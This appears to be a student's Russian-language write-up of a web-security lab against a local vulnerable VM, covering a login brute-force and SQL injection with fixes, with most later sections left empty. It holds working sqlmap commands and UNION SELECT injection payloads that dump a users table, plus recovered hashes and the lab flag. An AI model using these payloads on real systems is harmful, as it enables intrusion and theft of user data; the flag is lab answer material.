| [README](README.md) | [subject](sublect_ru.md) | [How to start a web server](howTo.md) | defense |
|-|-|-|-|

#Защита проекта

Запускаем ВМ, получаем на экране IP адрес запущенного сервера. 

<img width="1200" alt="Screen Shot 2022-11-11 at 11 16 21" src="https://user-images.githubusercontent.com/84193980/201297810-9f5e8917-2f55-4ee0-96ad-2d347395af7f.png">

На Маке в браузере вводим этот адрес:

<img width="1276" alt="Screen Shot 2022-11-11 at 11 23 36" src="https://user-images.githubusercontent.com/84193980/201297804-96514ae7-6e1f-46de-b987-7e2d2c776cee.png">

<details><summary>01. Brute force данных для входа</summary>

| Найдено на странице | http://192.168.56.3/?page=signin |
|-|-|

[The main source of information](https://owasp.org)

<details><summary>Что такое `Brute force` и как взломано</summary>
  
![44-BruteForce](https://user-images.githubusercontent.com/84193980/201331815-afabace6-0df6-4de6-83cf-549b7577436b.jpeg)

`Brute force` использует метод проб и ошибок, чтобы угадать данные для входа, ключи шифрования или найти скрытую веб-страницу. Хакеры перебирают все возможные комбинации, надеясь угадать правильно.

Это старый метод атаки, но он по-прежнему эффективен и популярен среди хакеров. Потому что в зависимости от длины и сложности пароля его взлом может занять от нескольких секунд до многих лет.

На вышеуказанной странице мы можем ввести логин и пароль. 
  
 <img width="1169" alt="Screen Shot 2022-11-11 at 14 36 53" src="https://user-images.githubusercontent.com/84193980/201332789-dce4b467-d603-40db-897b-82bceeffb68f.png">
 
Когда мы вводим неправильный пароль, мы видим, что веб-страница перенаправляет на следующую страницу, на которой есть очень специфическое изображение images/WrongAnswer.gif:

<img width="1904" alt="Screen Shot 2022-11-11 at 14 35 05" src="https://user-images.githubusercontent.com/84193980/201332820-9375ec69-2e0b-4a86-b11c-2f21fc528212.png">
 
Мы можем использовать это для `Brute force` процесса входа в систему.

Для этого из [OWASP SecLists](https://github.com/danielmiessler/SecLists) используем наиболее часто используемые [имена пользователей](https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt) и [паролей](https://github.com/danielmiessler/SecLists/blob/master/Passwords/2020-200_most_used_passwords.txt)

Используя простой скрипт, мы можем попробовать каждую комбинацию наиболее часто используемых паролей и имен пользователей, и если мы не видим изображение «WrongAnswer.gif» на экране, то это означает, что мы успешно вошли в систему!

</details>

Брутфорсем получены следующие пароли:

<img width="469" alt="Screen Shot 2022-11-12 at 10 19 08" src="https://user-images.githubusercontent.com/84193980/201462532-0daca35f-8422-41f0-9d10-5efb0e9912f3.png">

Заходим по адресу: http://192.168.56.3/?page=signin, вводим логин и пароль. Наслаждаемся!

### Как исправить:
- Используйте более надежное имя пользователя и пароль
- Brute force detection tools
- Captcha
- Анализ и блокировка поступающих запросов:
	- Извлечение необходимых для принятия решений данных (IP, URL, ARGS, BODY);
	- Фильтрация полученных данных с исключением нецелевых URI для уменьшения количества ложных срабатываний;
	- Выбор запросов с одного адреса на конкретный URI по мере их близости или запросов со всех адресов на конкретный URI (для выявления распределенных атак методом перебора) в рамках определенного временного окна;
	- Блокирование источника(ов) атаки при превышении пороговых значений.

----

</details>

<details><summary>02. Атака с внедрением SQL на странице поиска пользователя</summary>

| Найдено на странице | http://192.168.56.3/index.php?page=member |
|-|-|

[SQL injection](https://www.owasp.org/index.php/SQL_Injection)

<details><summary>Что такое `Атака с внедрением SQL` и как взломано</summary>

## Обзор ##
Атака с внедрением SQL состоит во вставке или «внедрении» SQL-запроса через входные данные от клиента к приложению. Успешный эксплойт SQL-инъекции может считывать конфиденциальные данные из базы данных, изменять данные базы данных (вставлять/обновлять/удалять), выполнять административные операции в базе данных (например, отключение СУБД), восстанавливать содержимое заданного файла, присутствующего в файле СУБД. систему и в некоторых случаях отдавать команды операционной системе. Атаки с внедрением SQL — это тип атаки с внедрением, при котором команды SQL вводятся во входные данные плоскости данных, чтобы повлиять на выполнение предопределенных команд SQL.

## Моделирование угроз ##
- Атаки с внедрением SQL позволяют злоумышленникам подделывать личность, вмешиваться в существующие данные, вызывать проблемы отказа, такие как аннулирование транзакций или изменение баланса, обеспечивать полное раскрытие всех данных в системе, уничтожать данные или делать их недоступными иным образом, а также становиться администраторами сервер базы данных.
- Внедрение SQL очень распространено в приложениях PHP и ASP из-за преобладания старых функциональных интерфейсов. Из-за характера доступных программных интерфейсов приложения J2EE и ASP.NET с меньшей вероятностью могут легко использовать SQL-инъекции.
- Серьезность атак с внедрением SQL-кода ограничивается навыками и воображением злоумышленника и, в меньшей степени, контрмерами глубокой защиты, такими как подключения с низким уровнем привилегий к серверу базы данных и т. д. Как правило, SQL-инъекция считается серьезной угрозой.

## Описание ##
Атака с внедрением SQL происходит, когда:
- Непреднамеренные данные попадают в программу из ненадежного источника.
- Данные используются для динамического построения SQL-запроса.

## Основные последствия: ##
- Конфиденциальность: поскольку базы данных SQL обычно содержат конфиденциальные данные, потеря конфиденциальности является частой проблемой с уязвимостями SQL Injection.
- Аутентификация: если для проверки имен пользователей и паролей используются плохие SQL-команды, может оказаться возможным подключиться к системе от имени другого пользователя, ранее не знающего пароль.
- Авторизация: если информация об авторизации хранится в базе данных SQL, можно изменить эту информацию путем успешного использования уязвимости SQL Injection.
- Целостность: так же, как может быть возможно прочитать конфиденциальную информацию, также возможно внести изменения или даже удалить эту информацию с помощью атаки SQL Injection.

## Как взломано ##
- Метод 1. С помощью внешней программы sqlmap
	- Склонить
	```bash
	(git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
	```
	- Выведем на экран список таблиц, для этого перейдём в папку программы и запустим:
	```bash
	python3 sqlmap.py -u http://192.168.56.3/index.php\?page\=member\&id\=1\&Submit\=Submit\# --tables
	```
	- Выведем дамп таблицы users:
	```
	python3 sqlmap.py -u http://192.168.56.3/index.php\?page\=member\&id\=1\&Submit\=Submit\# --dump -T users
	```
	<img width="2010" alt="Screen Shot 2022-11-12 at 13 30 10" src="https://user-images.githubusercontent.com/84193980/201477756-53d0b759-bbe1-4e0e-9c3f-ffdefdb32913.png">

		Decrypt this password -> then lower all the char. Sh256 on it and it's good ! 
		key: 5ff9d0165b4f92b14994e5c685cdce28 
		oter keys:
		2b3366bcfd44f540e630d4dc2b9b06d9
		60e9032c586fb422e2c16dee6286cf10 (oktoberfest)
		e083b24a01c483437bcf4a9eea7c1b4d 

- Метод 2. Через поле ввода страницы сайта.

	- Если оставить поле ввода пустым и нажать Enter, то мы получим:
	```
	You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '' at line 1
	```

	Значит, используется MariaDB

	Ввести в поле ввода:

	```
	1 UNION SELECT table_name, column_name FROM information_schema.columns
	```

	Посмотрим на поля таблицы users: user_id, first_name, last_name, town, ountry, planet, Commentaire, countersign

	Что бы посмотреть все данные пользователей:
	```
	1 OR 1=2 UNION SELECT user_id, CONCAT(first_name, last_name, town, country, planet, Commentaire, countersign) FROM users
	```
	<img width="922" alt="Screen Shot 2022-11-12 at 16 59 20" src="https://user-images.githubusercontent.com/84193980/201477846-0f12c5e8-c33f-41dc-a94e-1755141cab9d.png">

	или

	Запустить скрипт:
	```
	./get_page.sh
	192.168.56.3
	 ```
	<img width="1560" alt="Screen Shot 2022-11-12 at 16 24 55" src="https://user-images.githubusercontent.com/84193980/201477797-c91bba96-6d18-4aab-81f4-6d212cff7c24.png">

- Нас интересует пользователь, в Surname которого указано "Decrypt this password"

</details>

Полученный ключ: 5ff9d0165b4f92b14994e5c685cdce28

[Convert a string to a MD5 hash](https://md5.gromweb.com/?md5=5ff9d0165b4f92b14994e5c685cdce28): FortyTwo (like oktoberfest in other keys)

lower all the char: fortytwo

[sh256](https://crypt-online.ru/crypts/sha256/): 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5

### Как исправить:
- предварительно обработать параметры SQL-запроса, в том числе привести к целочисленному типу, экранировать значения, подготовленные значения (https://htmlacademy.ru/tutorial/php/sql-injections)

----

</details>

<details><summary>03. Атака с внедрением SQL на странице поиска картинки</summary>

| Найдено на странице | http://192.168.56.3/index.php?page=searchimg |
|-|-|

<details><summary>Что такое `` и как взломано</summary>



</details>



### Как исправить:
- 

----

</details>

<details><summary>04. </summary>

| Найдено на странице |  |
|-|-|

<details><summary>Что такое `` и как взломано</summary>



</details>



### Как исправить:
- 

----

</details>

<details><summary>05. </summary>

| Найдено на странице |  |
|-|-|

<details><summary>Что такое `` и как взломано</summary>



</details>



### Как исправить:
- 

----

</details>

<details><summary>06. </summary>

| Найдено на странице |  |
|-|-|

<details><summary>Что такое `` и как взломано</summary>



</details>



### Как исправить:
- 

----

</details>

<details><summary>07. </summary>

| Найдено на странице |  |
|-|-|

<details><summary>Что такое `` и как взломано</summary>



</details>



### Как исправить:
- 

----

</details>

<details><summary>08. </summary>

| Найдено на странице |  |
|-|-|

<details><summary>Что такое `` и как взломано</summary>



</details>



### Как исправить:
- 

----

</details>

<details><summary>09. </summary>

| Найдено на странице |  |
|-|-|

<details><summary>Что такое `` и как взломано</summary>



</details>



### Как исправить:
- 

----

</details>

<details><summary>10. </summary>

| Найдено на странице |  |
|-|-|

<details><summary>Что такое `` и как взломано</summary>



</details>



### Как исправить:
- 

----

</details>

<details><summary>11. </summary>

| Найдено на странице |  |
|-|-|

<details><summary>Что такое `` и как взломано</summary>



</details>



### Как исправить:
- 

----

</details>

<details><summary>12. </summary>

| Найдено на странице |  |
|-|-|

<details><summary>Что такое `` и как взломано</summary>



</details>



### Как исправить:
- 

----

</details>

<details><summary>13. </summary>

| Найдено на странице |  |
|-|-|

<details><summary>Что такое `` и как взломано</summary>



</details>



### Как исправить:
- 

----

</details>

<details><summary>14. </summary>

| Найдено на странице |  |
|-|-|

<details><summary>Что такое `` и как взломано</summary>



</details>



### Как исправить:
- 

----

</details>


| [README](README.md) | [subject](sublect_ru.md) | [How to start a web server](howTo.md) | defense |
|-|-|-|-|
